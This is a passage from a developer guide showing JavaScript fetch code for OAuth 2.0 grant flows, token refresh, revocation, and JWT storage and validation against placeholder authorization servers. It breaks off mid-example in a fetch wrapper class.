The client redirects the user to the authorization server. This typically happens via a standard link or redirect, not fetch:

```javascript
const authUrl = new URL('https://authorization-server.com/oauth/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('client_id', 'your_client_id');
authUrl.searchParams.set('redirect_uri', 'https://your-app.com/callback');
authUrl.searchParams.set('scope', 'read write');
authUrl.searchParams.set('state', generateRandomState());

window.location.href = authUrl.toString();
```

#### Token Exchange Request

After receiving the authorization code in the callback, exchange it for tokens:

```javascript
async function exchangeCodeForToken(code) {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': 'application/json'
    },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: 'https://your-app.com/callback',
      client_id: 'your_client_id',
      client_secret: 'your_client_secret'
    })
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(`Token exchange failed: ${error.error_description}`);
  }

  const tokens = await response.json();
  // tokens contains: access_token, refresh_token, expires_in, token_type
  return tokens;
}
```

#### PKCE Extension

PKCE (Proof Key for Code Exchange) adds security for public clients:

```javascript
// Generate code verifier and challenge
function generateCodeVerifier() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return base64URLEncode(array);
}

async function generateCodeChallenge(verifier) {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return base64URLEncode(new Uint8Array(hash));
}

function base64URLEncode(buffer) {
  return btoa(String.fromCharCode(...buffer))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// Authorization request with PKCE
const codeVerifier = generateCodeVerifier();
const codeChallenge = await generateCodeChallenge(codeVerifier);

const authUrl = new URL('https://authorization-server.com/oauth/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('code_challenge', codeChallenge);
authUrl.searchParams.set('code_challenge_method', 'S256');
// ... other parameters

// Token exchange with PKCE
async function exchangeWithPKCE(code, verifier) {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: 'https://your-app.com/callback',
      client_id: 'your_client_id',
      code_verifier: verifier
    })
  });

  return await response.json();
}
```

### Implicit Flow

[Unverified: The implicit flow is deprecated in OAuth 2.0 Security Best Current Practice (BCP), but may still be encountered in legacy systems]

The implicit flow returns tokens directly from the authorization endpoint without an intermediate code exchange:

```javascript
// Authorization request
const authUrl = new URL('https://authorization-server.com/oauth/authorize');
authUrl.searchParams.set('response_type', 'token');
authUrl.searchParams.set('client_id', 'your_client_id');
authUrl.searchParams.set('redirect_uri', 'https://your-app.com/callback');
authUrl.searchParams.set('scope', 'read');
authUrl.searchParams.set('state', generateRandomState());

window.location.href = authUrl.toString();

// Parse token from URL fragment
function parseTokenFromFragment() {
  const hash = window.location.hash.substring(1);
  const params = new URLSearchParams(hash);
  
  return {
    access_token: params.get('access_token'),
    token_type: params.get('token_type'),
    expires_in: params.get('expires_in'),
    state: params.get('state')
  };
}
```

### Client Credentials Flow

Used for machine-to-machine authentication where no user is involved:

```javascript
async function getClientCredentialsToken() {
  const credentials = btoa(`${clientId}:${clientSecret}`);
  
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Authorization': `Basic ${credentials}`,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      scope: 'api:read api:write'
    })
  });

  if (!response.ok) {
    throw new Error(`Authentication failed: ${response.status}`);
  }

  return await response.json();
}

// Alternative: credentials in body
async function getClientCredentialsTokenBodyAuth() {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      client_id: 'your_client_id',
      client_secret: 'your_client_secret',
      scope: 'api:read api:write'
    })
  });

  return await response.json();
}
```

### Resource Owner Password Credentials Flow

[Unverified: This flow is also deprecated in OAuth 2.0 Security BCP due to security concerns]

Direct exchange of username and password for tokens:

```javascript
async function loginWithPassword(username, password) {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'password',
      username: username,
      password: password,
      client_id: 'your_client_id',
      client_secret: 'your_client_secret',
      scope: 'read write'
    })
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(`Login failed: ${error.error_description}`);
  }

  return await response.json();
}
```

### Refresh Token Flow

Used to obtain new access tokens without user interaction:

```javascript
async function refreshAccessToken(refreshToken) {
  const response = await fetch('https://authorization-server.com/oauth/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
      client_id: 'your_client_id',
      client_secret: 'your_client_secret'
    })
  });

  if (!response.ok) {
    const error = await response.json();
    if (error.error === 'invalid_grant') {
      // Refresh token expired or revoked - need full re-authentication
      throw new Error('REFRESH_TOKEN_EXPIRED');
    }
    throw new Error(`Token refresh failed: ${error.error_description}`);
  }

  const tokens = await response.json();
  // May include new refresh_token, or reuse the existing one
  return tokens;
}

// Automatic refresh before expiration
class TokenManager {
  constructor(tokens) {
    this.accessToken = tokens.access_token;
    this.refreshToken = tokens.refresh_token;
    this.expiresAt = Date.now() + (tokens.expires_in * 1000);
    this.refreshThreshold = 300000; // 5 minutes
  }

  async getValidToken() {
    const timeUntilExpiry = this.expiresAt - Date.now();
    
    if (timeUntilExpiry < this.refreshThreshold) {
      const newTokens = await refreshAccessToken(this.refreshToken);
      this.accessToken = newTokens.access_token;
      if (newTokens.refresh_token) {
        this.refreshToken = newTokens.refresh_token;
      }
      this.expiresAt = Date.now() + (newTokens.expires_in * 1000);
    }
    
    return this.accessToken;
  }
}
```

### Device Authorization Flow

For devices with limited input capabilities:

```javascript
async function initiateDeviceFlow() {
  const response = await fetch('https://authorization-server.com/oauth/device/code', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      client_id: 'your_client_id',
      scope: 'read write'
    })
  });

  const data = await response.json();
  // Returns: device_code, user_code, verification_uri, expires_in, interval
  return data;
}

async function pollForDeviceToken(deviceCode, interval = 5) {
  const pollInterval = interval * 1000;
  
  while (true) {
    await new Promise(resolve => setTimeout(resolve, pollInterval));
    
    const response = await fetch('https://authorization-server.com/oauth/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
        device_code: deviceCode,
        client_id: 'your_client_id'
      })
    });

    const data = await response.json();
    
    if (response.ok) {
      return data; // Contains access_token, refresh_token, etc.
    }
    
    if (data.error === 'authorization_pending') {
      continue; // User hasn't authorized yet
    }
    
    if (data.error === 'slow_down') {
      // Increase polling interval
      await new Promise(resolve => setTimeout(resolve, 5000));
      continue;
    }
    
    if (data.error === 'expired_token') {
      throw new Error('Device code expired');
    }
    
    throw new Error(`Device flow failed: ${data.error_description}`);
  }
}

// Usage
async function deviceFlowExample() {
  const deviceAuth = await initiateDeviceFlow();
  
  console.log(`Visit ${deviceAuth.verification_uri}`);
  console.log(`Enter code: ${deviceAuth.user_code}`);
  
  const tokens = await pollForDeviceToken(
    deviceAuth.device_code, 
    deviceAuth.interval
  );
  
  return tokens;
}
```

### Token Introspection

Validate and retrieve metadata about tokens:

```javascript
async function introspectToken(token) {
  const credentials = btoa(`${clientId}:${clientSecret}`);
  
  const response = await fetch('https://authorization-server.com/oauth/introspect', {
    method: 'POST',
    headers: {
      'Authorization': `Basic ${credentials}`,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      token: token,
      token_type_hint: 'access_token'
    })
  });

  const data = await response.json();
  
  // Response includes: active, scope, client_id, username, exp, iat, etc.
  return data;
}

async function validateToken(token) {
  const introspection = await introspectToken(token);
  
  if (!introspection.active) {
    throw new Error('Token is not active');
  }
  
  if (introspection.exp && introspection.exp < Date.now() / 1000) {
    throw new Error('Token has expired');
  }
  
  return introspection;
}
```

### Token Revocation

Explicitly invalidate tokens:

```javascript
async function revokeToken(token, tokenTypeHint = 'access_token') {
  const credentials = btoa(`${clientId}:${clientSecret}`);
  
  const response = await fetch('https://authorization-server.com/oauth/revoke', {
    method: 'POST',
    headers: {
      'Authorization': `Basic ${credentials}`,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      token: token,
      token_type_hint: tokenTypeHint
    })
  });

  // Revocation endpoint returns 200 even if token was already invalid
  if (!response.ok) {
    throw new Error(`Revocation failed: ${response.status}`);
  }
}

async function logout(accessToken, refreshToken) {
  // Revoke both tokens
  await revokeToken(refreshToken, 'refresh_token');
  await revokeToken(accessToken, 'access_token');
  
  // Clear local storage
  localStorage.removeItem('access_token');
  localStorage.removeItem('refresh_token');
}
```

### Making Authenticated API Requests

Using obtained tokens with fetch:

```javascript
async function makeAuthenticatedRequest(url, token, options = {}) {
  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`,
      'Accept': 'application/json'
    }
  });

  if (response.status === 401) {
    throw new Error('UNAUTHORIZED');
  }

  if (!response.ok) {
    throw new Error(`Request failed: ${response.status}`);
  }

  return await response.json();
}

// With automatic token refresh
class AuthenticatedFetch {
  constructor(tokenManager) {
    this.tokenManager = tokenManager;
  }

  async fetch(url, options = {}) {
    const token = await this.tokenManager.getValidToken();
    
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });

    if (response.status === 401) {
      // Token might have been revoked, try refreshing
      await this.tokenManager.getValidToken(true); // Force refresh
      const newToken = await this.tokenManager.getValidToken();
      
      // Retry with new token
      return fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${newToken}`
        }
      });
    }

    return response;
  }
}
```

### Error Handling

Standardized OAuth 2.0 error responses:

```javascript
class OAuthError extends Error {
  constructor(error, description, uri) {
    super(description || error);
    this.error = error;
    this.description = description;
    this.uri = uri;
  }
}

async function handleOAuthResponse(response) {
  if (!response.ok) {
    const errorData = await response.json();
    throw new OAuthError(
      errorData.error,
      errorData.error_description,
      errorData.error_uri
    );
  }
  return await response.json();
}

// Common error codes
const ERROR_HANDLERS = {
  'invalid_request': (err) => {
    console.error('Malformed request:', err.description);
  },
  'invalid_client': (err) => {
    console.error('Client authentication failed:', err.description);
  },
  'invalid_grant': (err) => {
    console.error('Grant invalid/expired:', err.description);
    // Trigger re-authentication
  },
  'unauthorized_client': (err) => {
    console.error('Client not authorized for this grant type:', err.description);
  },
  'unsupported_grant_type': (err) => {
    console.error('Grant type not supported:', err.description);
  },
  'invalid_scope': (err) => {
    console.error('Requested scope invalid:', err.description);
  }
};

async function safeTokenRequest(url, params) {
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams(params)
    });

    return await handleOAuthResponse(response);
  } catch (error) {
    if (error instanceof OAuthError) {
      const handler = ERROR_HANDLERS[error.error];
      if (handler) {
        handler(error);
      }
    }
    throw error;
  }
}
```

### State Parameter Validation

Protecting against CSRF attacks:

```javascript
function generateState() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

function storeState(state) {
  sessionStorage.setItem('oauth_state', state);
  sessionStorage.setItem('oauth_state_timestamp', Date.now().toString());
}

function validateState(receivedState) {
  const storedState = sessionStorage.getItem('oauth_state');
  const timestamp = sessionStorage.getItem('oauth_state_timestamp');
  
  // Clear stored state
  sessionStorage.removeItem('oauth_state');
  sessionStorage.removeItem('oauth_state_timestamp');
  
  if (!storedState) {
    throw new Error('No state found in session');
  }
  
  // Check state hasn't expired (5 minutes)
  if (Date.now() - parseInt(timestamp) > 300000) {
    throw new Error('State has expired');
  }
  
  if (storedState !== receivedState) {
    throw new Error('State mismatch - possible CSRF attack');
  }
  
  return true;
}

// Usage in callback
function handleCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  const state = params.get('state');
  const error = params.get('error');
  
  if (error) {
    throw new Error(`Authorization failed: ${error}`);
  }
  
  validateState(state);
  
  return exchangeCodeForToken(code);
}
```

### Scope Management

Handling OAuth 2.0 scopes:

```javascript
class ScopeManager {
  constructor(grantedScopes) {
    this.scopes = new Set(grantedScopes.split(' '));
  }

  has(scope) {
    return this.scopes.has(scope);
  }

  hasAll(...requiredScopes) {
    return requiredScopes.every(scope => this.scopes.has(scope));
  }

  hasAny(...requiredScopes) {
    return requiredScopes.some(scope => this.scopes.has(scope));
  }

  toString() {
    return Array.from(this.scopes).join(' ');
  }
}

async function requestWithScopes(url, requiredScopes, tokenManager) {
  const token = await tokenManager.getValidToken();
  const tokenData = await introspectToken(token);
  const scopeManager = new ScopeManager(tokenData.scope);
  
  if (!scopeManager.hasAll(...requiredScopes)) {
    throw new Error(`Missing required scopes: ${requiredScopes.join(', ')}`);
  }
  
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
}
```

### Dynamic Client Registration

Programmatically register OAuth clients:

```javascript
async function registerClient(registrationEndpoint, metadata) {
  const response = await fetch(registrationEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify({
      client_name: metadata.clientName,
      redirect_uris: metadata.redirectUris,
      grant_types: metadata.grantTypes || ['authorization_code', 'refresh_token'],
      response_types: metadata.responseTypes || ['code'],
      token_endpoint_auth_method: metadata.authMethod || 'client_secret_basic',
      scope: metadata.scope,
      logo_uri: metadata.logoUri,
      contacts: metadata.contacts
    })
  });

  if (!response.ok) {
    throw new Error(`Registration failed: ${response.status}`);
  }

  const registration = await response.json();
  // Returns: client_id, client_secret, registration_access_token, etc.
  return registration;
}

// Update registered client
async function updateClient(registrationEndpoint, clientId, accessToken, updates) {
  const response = await fetch(`${registrationEndpoint}/${clientId}`, {
    method: 'PUT',
    headers: {
      'Authorization': `Bearer ${accessToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(updates)
  });

  return await response.json();
}
```

### JWT Bearer Token Flow

Using JWT assertions for authorization:

```javascript
async function createJWTAssertion(clientId, tokenEndpoint, privateKey) {
  const header = {
    alg: 'RS256',
    typ: 'JWT'
  };

  const payload = {
    iss: clientId,
    sub: clientId,
    aud: tokenEndpoint,
    exp: Math.floor(Date.now() / 1000) + 3600,
    iat: Math.floor(Date.now() / 1000),
    jti: generateRandomId()
  };

  // Sign JWT (requires crypto library or Web Crypto API)
  const token = await signJWT(header, payload, privateKey);
  return token;
}

async function getTokenWithJWTBearer(tokenEndpoint, assertion) {
  const response = await fetch(tokenEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
      assertion: assertion,
      scope: 'api:read api:write'
    })
  });

  return await response.json();
}
```

### Token Exchange (RFC 8693)

Exchange one token for another:

```javascript
async function exchangeToken(options) {
  const {
    tokenEndpoint,
    subjectToken,
    subjectTokenType = 'urn:ietf:params:oauth:token-type:access_token',
    requestedTokenType = 'urn:ietf:params:oauth:token-type:access_token',
    resource,
    audience,
    scope
  } = options;

  const response = await fetch(tokenEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:token-exchange',
      subject_token: subjectToken,
      subject_token_type: subjectTokenType,
      requested_token_type: requestedTokenType,
      ...(resource && { resource }),
      ...(audience && { audience }),
      ...(scope && { scope })
    })
  });

  const data = await response.json();
  // Returns: access_token, issued_token_type, token_type, expires_in, scope
  return data;
}

// Example: Exchange user token for service token
async function getServiceToken(userToken) {
  return exchangeToken({
    tokenEndpoint: 'https://auth-server.com/token',
    subjectToken: userToken,
    audience: 'https://backend-service.com',
    scope: 'service:read service:write'
  });
}
```

### Pushed Authorization Requests (PAR)

Enhanced security by pushing request parameters directly to authorization server:

```javascript
async function pushAuthorizationRequest(parEndpoint, params) {
  const credentials = btoa(`${clientId}:${clientSecret}`);
  
  const response = await fetch(parEndpoint, {
    method: 'POST',
    headers: {
      'Authorization': `Basic ${credentials}`,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      response_type: params.responseType || 'code',
      client_id: params.clientId,
      redirect_uri: params.redirectUri,
      scope: params.scope,
      state: params.state,
      code_challenge: params.codeChallenge,
      code_challenge_method: params.codeChallengeMethod,
      ...params.additional
    })
  });

  const data = await response.json();
  // Returns: request_uri, expires_in
  return data;
}

async function authorizeWithPAR() {
  // Push authorization request
  const parResponse = await pushAuthorizationRequest(
    'https://auth-server.com/par',
    {
      clientId: 'your_client_id',
      redirectUri: 'https://your-app.com/callback',
      scope: 'read write',
      state: generateState(),
      codeChallenge: await generateCodeChallenge(codeVerifier),
      codeChallengeMethod: 'S256'
    }
  );

  // Redirect with request_uri
  const authUrl = new URL('https://auth-server.com/authorize');
  authUrl.searchParams.set('client_id', 'your_client_id');
  authUrl.searchParams.set('request_uri', parResponse.request_uri);
  
  window.location.href = authUrl.toString();
}
```

---

## JWT Handling

### Token Storage Strategies

**localStorage vs sessionStorage vs Memory**

Storing JWTs in `localStorage` persists tokens across browser sessions but exposes them to XSS attacks since any JavaScript on the page can access them. `sessionStorage` provides similar accessibility but clears on tab close. In-memory storage (JavaScript variables) offers better XSS protection but tokens are lost on page refresh.

**HttpOnly Cookies**

The most secure approach stores JWTs in HttpOnly cookies set by the server. These cookies are inaccessible to JavaScript, protecting against XSS. The browser automatically includes them in requests to the same domain. This requires backend cooperation to set the `Set-Cookie` header with `HttpOnly`, `Secure`, and `SameSite` attributes.

### Sending JWT in Requests

**Authorization Header Pattern**

```javascript
fetch('https://api.example.com/protected', {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
})
```

The `Bearer` scheme is the standard for JWT transmission. The server extracts the token from the header, verifies the signature, and validates claims before processing the request.

**Credentials with Cookies**

```javascript
fetch('https://api.example.com/protected', {
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  }
})
```

The `credentials: 'include'` option instructs fetch to send cookies cross-origin. For same-origin requests, use `'same-origin'`. The server must respond with appropriate CORS headers including `Access-Control-Allow-Credentials: true`.

### Token Refresh Mechanisms

**Refresh Token Flow**

Access tokens have short lifespans (5-15 minutes typically). Refresh tokens, stored more securely, have longer validity. When an access token expires (401 response), the client requests a new one using the refresh token:

```javascript
async function refreshAccessToken(refreshToken) {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ refreshToken })
  });
  
  if (!response.ok) throw new Error('Refresh failed');
  
  const { accessToken, refreshToken: newRefreshToken } = await response.json();
  return { accessToken, refreshToken: newRefreshToken };
}
```

**Automatic Retry with Refresh**

Intercepting 401 responses to automatically refresh and retry:

```javascript
async function fetchWithAuth(url, options = {}) {
  let token = getStoredToken();
  
  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
  
  if (response.status === 401) {
    // Token expired, attempt refresh
    const refreshToken = getStoredRefreshToken();
    const tokens = await refreshAccessToken(refreshToken);
    storeTokens(tokens);
    
    // Retry original request with new token
    response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${tokens.accessToken}`
      }
    });
  }
  
  return response;
}
```

**Proactive Refresh**

Checking token expiration before requests prevents failed requests:

```javascript
function isTokenExpired(token) {
  const payload = JSON.parse(atob(token.split('.')[1]));
  const expirationTime = payload.exp * 1000; // Convert to milliseconds
  const bufferTime = 60000; // Refresh 1 minute before expiry
  return Date.now() >= (expirationTime - bufferTime);
}

async function getValidToken() {
  let token = getStoredToken();
  
  if (isTokenExpired(token)) {
    const refreshToken = getStoredRefreshToken();
    const tokens = await refreshAccessToken(refreshToken);
    storeTokens(tokens);
    token = tokens.accessToken;
  }
  
  return token;
}
```

### Handling Multiple Concurrent Requests

**Race Condition Prevention**

When multiple requests detect token expiration simultaneously, you need to ensure only one refresh request occurs:

```javascript
let refreshPromise = null;

async function getValidToken() {
  let token = getStoredToken();
  
  if (isTokenExpired(token)) {
    // If refresh already in progress, wait for it
    if (refreshPromise) {
      await refreshPromise;
      return getStoredToken();
    }
    
    // Start new refresh
    refreshPromise = refreshAccessToken(getStoredRefreshToken())
      .then(tokens => {
        storeTokens(tokens);
        refreshPromise = null;
        return tokens.accessToken;
      })
      .catch(error => {
        refreshPromise = null;
        throw error;
      });
    
    return refreshPromise;
  }
  
  return token;
}
```

**Request Queue Pattern**

Queuing requests during token refresh:

```javascript
class AuthQueue {
  constructor() {
    this.isRefreshing = false;
    this.failedQueue = [];
  }
  
  processQueue(error, token = null) {
    this.failedQueue.forEach(promise => {
      if (error) {
        promise.reject(error);
      } else {
        promise.resolve(token);
      }
    });
    
    this.failedQueue = [];
  }
  
  async fetchWithAuth(url, options = {}) {
    let token = getStoredToken();
    
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
    
    if (response.status === 401) {
      if (this.isRefreshing) {
        // Wait in queue
        return new Promise((resolve, reject) => {
          this.failedQueue.push({ resolve, reject });
        }).then(newToken => {
          return fetch(url, {
            ...options,
            headers: {
              ...options.headers,
              'Authorization': `Bearer ${newToken}`
            }
          });
        });
      }
      
      this.isRefreshing = true;
      
      try {
        const tokens = await refreshAccessToken(getStoredRefreshToken());
        storeTokens(tokens);
        this.processQueue(null, tokens.accessToken);
        
        return fetch(url, {
          ...options,
          headers: {
            ...options.headers,
            'Authorization': `Bearer ${tokens.accessToken}`
          }
        });
      } catch (error) {
        this.processQueue(error, null);
        throw error;
      } finally {
        this.isRefreshing = false;
      }
    }
    
    return response;
  }
}
```

### Token Validation Client-Side

**Signature Verification Limitations**

[Inference] Client-side signature verification using Web Crypto API is possible but provides limited security value since an attacker controlling the client can bypass it. True validation occurs server-side.

**Claims Extraction and Checking**

```javascript
function parseJWT(token) {
  const [header, payload, signature] = token.split('.');
  
  return {
    header: JSON.parse(atob(header)),
    payload: JSON.parse(atob(payload)),
    signature
  };
}

function validateClaims(payload) {
  const now = Math.floor(Date.now() / 1000);
  
  // Check expiration
  if (payload.exp && payload.exp < now) {
    return { valid: false, reason: 'Token expired' };
  }
  
  // Check not before
  if (payload.nbf && payload.nbf > now) {
    return { valid: false, reason: 'Token not yet valid' };
  }
  
  // Check issuer
  const expectedIssuer = 'https://your-auth-server.com';
  if (payload.iss !== expectedIssuer) {
    return { valid: false, reason: 'Invalid issuer' };
  }
  
  // Check audience
  const expectedAudience = 'your-api-identifier';
  if (payload.aud !== expectedAudience) {
    return { valid: false, reason: 'Invalid audience' };
  }
  
  return { valid: true };
}
```

### Error Handling Patterns

**Distinguishing Auth Errors**

```javascript
class AuthError extends Error {
  constructor(message, type) {
    super(message);
    this.name = 'AuthError';
    this.type = type; // 'expired', 'invalid', 'refresh_failed'
  }
}

async function handleAuthResponse(response) {
  if (response.status === 401) {
    const errorData = await response.json().catch(() => ({}));
    
    if (errorData.code === 'token_expired') {
      throw new AuthError('Token expired', 'expired');
    } else if (errorData.code === 'invalid_token') {
      throw new AuthError('Invalid token', 'invalid');
    }
    
    throw new AuthError('Authentication failed', 'unknown');
  }
  
  if (response.status === 403) {
    throw new AuthError('Insufficient permissions', 'forbidden');
  }
  
  return response;
}
```

**Logout on Fatal Auth Errors**

```javascript
async function fetchWithAuthAndErrorHandling(url, options = {}) {
  try {
    return await fetchWithAuth(url, options);
  } catch (error) {
    if (error instanceof AuthError) {
      if (error.type === 'refresh_failed' || error.type === 'invalid') {
        // Clear tokens and redirect to login
        clearTokens();
        window.location.href = '/login';
        throw error;
      }
    }
    throw error;
  }
}
```

### CORS Considerations

**Preflight Handling**

Requests with custom `Authorization` headers trigger CORS preflight (OPTIONS request). The server must respond with:

```
Access-Control-Allow-Origin: https://your-frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400
```

**Credentials and Wildcard Origins**

When using `credentials: 'include'`, the server cannot use `Access-Control-Allow-Origin: *`. It must specify the exact origin. This prevents accidental credential leakage to untrusted origins.

### Token Revocation Handling

**Server-Side Revocation Detection**

If the server revokes a token (user logout, security incident), subsequent requests with that token fail with 401. The client must treat this as requiring reauthentication:

```javascript
async function fetchWithAuth(url, options = {}) {
  try {
    const token = await getValidToken();
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
    
    if (response.status === 401) {
      const errorData = await response.json().catch(() => ({}));
      
      // Token revoked or refresh token invalid
      if (errorData.code === 'token_revoked') {
        clearTokens();
        redirectToLogin();
        throw new AuthError('Session invalidated', 'revoked');
      }
      
      // Try refresh
      return await attemptRefreshAndRetry(url, options);
    }
    
    return response;
  } catch (error) {
    throw error;
  }
}
```

### Refresh Token Rotation

**One-Time Use Refresh Tokens**

Security-conscious implementations issue a new refresh token with each access token refresh, invalidating the old one:

```javascript
async function refreshAccessToken(currentRefreshToken) {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ refreshToken: currentRefreshToken })
  });
  
  if (!response.ok) {
    if (response.status === 401) {
      // Refresh token invalid or expired
      clearTokens();
      redirectToLogin();
    }
    throw new Error('Refresh failed');
  }
  
  const { accessToken, refreshToken: newRefreshToken } = await response.json();
  
  // Store both new tokens
  storeTokens({ accessToken, refreshToken: newRefreshToken });
  
  return { accessToken, refreshToken: newRefreshToken };
}
```

**Refresh Token Reuse Detection**

If a refresh token is used twice (possible replay attack), the server invalidates all tokens for that user. The client receives a specific error:

```javascript
async function refreshAccessToken(currentRefreshToken) {
  try {
    const response = await fetch('https://api.example.com/auth/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken: currentRefreshToken })
    });
    
    if (response.status === 401) {
      const errorData = await response.json();
      
      if (errorData.code === 'refresh_token_reuse_detected') {
        // Security incident - clear everything and force reauthentication
        clearAllUserData();
        alert('Security alert: Please log in again');
        redirectToLogin();
        throw new AuthError('Token reuse detected', 'security_violation');
      }
    }
    
    // ... rest of refresh logic
  } catch (error) {
    throw error;
  }
}
```

### Silent Authentication

**Hidden iframe Approach**

For applications using OAuth/OIDC with HttpOnly cookies, silent token renewal uses a hidden iframe:

```javascript
function silentTokenRenewal() {
  return new Promise((resolve, reject) => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    
    const timeoutId = setTimeout(() => {
      cleanup();
      reject(new Error('Silent renewal timeout'));
    }, 10000);
    
    function cleanup() {
      clearTimeout(timeoutId);
      window.removeEventListener('message', handleMessage);
      document.body.removeChild(iframe);
    }
    
    function handleMessage(event) {
      if (event.origin !== 'https://your-auth-server.com') return;
      
      if (event.data.type === 'renewal_success') {
        cleanup();
        resolve(event.data.token);
      } else if (event.data.type === 'renewal_failed') {
        cleanup();
        reject(new Error('Silent renewal failed'));
      }
    }
    
    window.addEventListener('message', handleMessage);
    document.body.appendChild(iframe);
    iframe.src = 'https://your-auth-server.com/auth/silent?client_id=your-client-id';
  });
}
```

### Token Payload Inspection

**Role-Based Access Control**

```javascript
function getUserRoles(token) {
  const { payload } = parseJWT(token);
  return payload.roles || [];
}

function hasPermission(token, requiredRole) {
  const roles = getUserRoles(token);
  return roles.includes(requiredRole);
}

async function fetchProtectedResource(url, requiredRole) {
  const token = await getValidToken();
  
  if (!hasPermission(token, requiredRole)) {
    throw new AuthError('Insufficient permissions', 'forbidden');
  }
  
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
}
```

**Custom Claims Usage**

```javascript
function extractCustomClaims(token) {
  const { payload } = parseJWT(token);
  
  return {
    userId: payload.sub,
    email: payload.email,
    organizationId: payload.org_id,
    subscription: payload.subscription_tier,
    permissions: payload.permissions || []
  };
}
```

### Background Token Refresh

**Scheduled Refresh**

```javascript
class TokenRefreshScheduler {
  constructor() {
    this.timeoutId = null;
  }
  
  scheduleRefresh(token) {
    this.cancelRefresh();
    
    const { payload } = parseJWT(token);
    const expirationTime = payload.exp * 1000;
    const refreshTime = expirationTime - (5 * 60 * 1000); // 5 minutes before expiry
    const delay = refreshTime - Date.now();
    
    if (delay > 0) {
      this.timeoutId = setTimeout(async () => {
        try {
          const refreshToken = getStoredRefreshToken();
          const tokens = await refreshAccessToken(refreshToken);
          storeTokens(tokens);
          this.scheduleRefresh(tokens.accessToken);
        } catch (error) {
          console.error('Background refresh failed:', error);
          redirectToLogin();
        }
      }, delay);
    }
  }
  
  cancelRefresh() {
    if (this.timeoutId) {
      clearTimeout(this.timeoutId);
      this.timeoutId = null;
    }
  }
}
```

### Fetch Wrapper Architectures

**Centralized Auth Fetch**

```javascript
class AuthenticatedFetch {
  constructor(baseURL, tokenManager) {
    this.baseURL = baseURL;
    this.tokenManager = tokenManager;
  }
  
  async fetch(endpoint, options = {}) {
    const token = await this.tokenManager.getValidToken();
    const url = `${this.baseURL}${endpoint}`;
    
    const response = await fetch(url, {
